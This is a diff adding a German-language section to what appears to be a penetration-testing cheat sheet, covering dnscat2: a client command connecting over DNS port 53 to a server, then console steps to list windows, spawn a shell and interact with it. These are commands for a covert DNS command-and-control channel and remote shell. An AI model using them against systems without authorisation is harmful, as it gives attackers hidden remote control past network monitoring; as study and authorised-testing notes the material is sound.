@@ -160,6 +160,27 @@ sudo apt install dnscat2
 dnscat --dns=server=[Target-IP],port=53
 ```
 
+### Shell erstellen
+- Fenster anzeigen lassen
+```
+windows
+```
+
+- Mit Fenster 1 interagieren
+```
+window -i 1
+```
+
+- Shell erstellen
+```
+shell
+```
+
+- Mit Shell interagieren
+```
+window -i 2
+```
+
 ## #nmap
 - Host-Detektion
 - Port-Scanning
